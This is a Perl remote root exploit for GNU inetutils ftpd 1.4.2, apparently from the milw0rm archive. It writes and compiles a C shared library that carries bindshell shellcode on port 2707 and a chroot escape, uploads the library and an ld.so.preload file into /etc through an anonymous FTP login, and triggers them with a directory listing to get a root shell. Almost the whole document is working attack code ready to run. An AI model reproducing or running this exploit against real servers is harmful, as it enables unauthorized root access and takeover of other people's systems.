# FTP server (GNU inetutils 1.4.2) Remote Root Exploit
# This program remotely exploits the most recent
# versions of GNU inetutils ftpd on linux systems.
#
# Requirements:
# 1. There MUST be a chroot'ed environment for the logged in user
# 2. Directory etc must be writeable by the logged in user (duh!)
#
# The exploit works as follows:
# 1. Create a shared library including a bindshell
# 2. Create a ld.so.preload file referencing the previously created shared library
# 3. Connect to the remote ftp server and log in using the ftp account
# 4. Upload the shared library and ld.so.preload into /etc
# 5. Run /bin/ls
#
# Result:
# uname -a;id;
# Linux XXXXX 2.6.11.9-vs2.0-rc1-node #1 SMP Fri May 13 11:52:23 CEST 2005 i686 GNU/Linux
# uid=0(root) gid=0(root) egid=70(ftp) groups=70(ftp)
#
# wu-ftpd has a setuid(ftp) before the execv to
# /bin/ls so there is no way escaping the chroot issued before.
#
# signed,
# kingcope Dec/2006
##############################################################################################

use Net::FTP;
open FILE, ">program.c";
print FILE <<EOF;
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

#define L_PORT "\\x0a\\x93"       /* Port 2707 */

char ficken[] = "\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x99\\x52\\x53\\x6a\\x02\\x89"
                "\\xe1\\xcd\\x80\\x52\\x43\\x68\\xff\\x02"L_PORT"\\x89\\xe1"
                "\\x6a\\x10\\x51\\x50\\x89\\xe1\\x89\\xc6\\xb0\\x66\\xcd\\x80"
                "\\x43\\x43\\xb0\\x66\\xcd\\x80\\x52\\x56\\x89\\xe1\\x43\\xb0"
                "\\x66\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\\x3f\\x49\\xcd\\x80"
                "\\x41\\xe2\\xf8\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f"
                "\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";

void _init()
{
  char *sh[2]={"/bin/sh",NULL};
  int gg=0xed;

  FILE *f;
  setreuid(0,0);
  setuid(0);
  remove("/etc/ld.so.preload");
  chdir("/");
  chroot("etc");
  while(gg!=0) {
        chdir("..");gg--;
  }
  chroot("..");

  void (*fc)();
  (long) fc = &ficken;
  fc();
}

EOF
close FILE;
open FILE,">ld.so.preload";
print FILE "/etc/libno_ex.so.1.0";
close FILE;
system("gcc -o program.o -c program.c -fPIC;gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles");
$ftp = Net::FTP->new($ARGV[0], Debug => 1) or die "Cannot connect to some.host.name: $@";
$ftp->login("ftp","ftp@") or die "Cannot login ", $ftp->message;
$ftp->binary;
$ftp->put("libno_ex.so.1.0", "/etc/libno_ex.so.1.0");
$ftp->put("ld.so.preload", "/etc/ld.so.preload");
print "\n\nNOTE: Running LS command, check the bindshell on port 2707.\n\n";
$ftp->dir();
$ftp->quit();

# milw0rm.com [2006-12-15]